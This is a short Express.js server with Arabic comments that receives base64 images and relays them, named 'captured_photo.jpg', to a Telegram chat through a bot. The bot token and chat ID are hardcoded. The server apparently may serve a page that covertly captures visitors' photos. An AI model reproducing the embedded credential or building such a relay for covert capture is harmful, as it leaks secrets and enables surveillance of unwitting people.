const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data'); // تم إضافتها هنا

const app = express();
// 🛑 التعديل الأهم: استخدام المنفذ الموفر من Render (process.env.PORT) 🛑
const PORT = process.env.PORT || 3000; 

// --- يجب إما تعديل هذه المتغيرات أو الأفضل وضعها في إعدادات Render (Environment Variables) ---
// تم إبقاء الرموز هنا مؤقتاً لتسهيل الاختبار
const BOT_TOKEN = '7899918022:AAFeO3ofPyWdsYkGLcDlULCtu_Tff_CQM60'; 
const CHAT_ID = '6969597735'; 
// ------------------------------------

// 1. استخدام Middlewares
app.use(cors()); 

// لاستقبال البيانات ذات الحجم الكبير (50 ميجابايت)
app.use(bodyParser.json({ limit: '50mb' })); 

// 2. مسار معالجة الصورة
app.post('/upload-photo', async (req, res) => {
    if (!req.body.image) {
        return res.status(400).json({ message: "لم يتم إرسال بيانات الصورة (Image data is missing)." });
    }

    const base64Data = req.body.image;
    // إزالة الجزء التعريفي (data:image/jpeg;base64,)
    const base64Image = base64Data.replace(/^data:image\/\w+;base64,/, "");

    // تحويل Base64 إلى Buffer (صيغة الملف الثنائية)
    const imageBuffer = Buffer.from(base64Image, 'base64');
    
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

    const form = new FormData();

    form.append('chat_id', CHAT_ID);
    // إرسال الصورة كـ Buffer 
    form.append('photo', imageBuffer, {
        filename: 'captured_photo.jpg',
        contentType: 'image/jpeg',
    });

    try {
        // إرسال الطلب إلى API تليجرام
        const response = await axios.post(telegramUrl, form, {
            headers: {
                ...form.getHeaders()
            }
        });

        if (response.data.ok) {
            console.log("تم إرسال الصورة بنجاح إلى تليجرام.");
            res.status(200).json({ message: "تم إرسال الصورة بنجاح." });
        } else {
            console.error("خطأ من تليجرام:", response.data);
            res.status(500).json({ message: "فشل في الإرسال إلى تليجرام.", error: response.data.description });
        }
    } catch (error) {
        console.error('خطأ في إرسال الطلب إلى تليجرام:', error.message);
        res.status(500).json({ message: "خطأ في الخادم أو فشل في الاتصال بـ Telegram API." });
    }
});

// 3. تشغيل الخادم
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
